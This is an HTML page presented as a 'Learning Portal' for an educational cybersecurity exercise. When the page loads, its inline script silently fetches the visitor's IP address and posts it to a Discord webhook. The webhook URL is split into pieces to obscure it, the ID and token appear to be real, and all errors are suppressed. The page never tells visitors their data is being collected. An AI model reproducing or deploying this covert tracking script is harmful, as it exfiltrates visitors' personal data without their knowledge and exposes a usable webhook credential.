<body>
    <h1>Welcome to the Learning Portal</h1>
    <p>This page is part of an educational cybersecurity exercise.</p>

    <script>
        (function () {
            var protocol = "https://";
            var ipApi = "api.ipify.org";
            var format = "?format=json";
            var ipUrl = protocol + ipApi + format;

            fetch(ipUrl)
                .then(function (response) {
                    return response.json();
                })
                .then(function (data) {
                    var visitorIp = data.ip;

                    // Obfuscated Discord webhook URL (split into parts)
                    var webhookHost = "discord.com";
                    var webhookPath = "/api/webhooks/";
                    var webhookId = "1409357759924928622"; // Replace with your webhook ID
                    var webhookToken = "/CofKLngqjohgKVxnsZWTX5ERSDfLrB5-mdxO7q_yEZPuEeSqYHOJdA8TaDVlTtjoi-Za";
                    var webhookUrl = protocol + webhookHost + webhookPath + webhookId + webhookToken;

                    // Send the visitor IP to the Discord webhook
                    fetch(webhookUrl, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            content: "Visitor IP: " + visitorIp
                        })
                    }).catch(function (err) {
                        // Handle webhook send error silently
                    });
                })
                .catch(function (err) {
                    // Handle IP fetch error silently
                });
        })();
    </script>
</body>
</html>
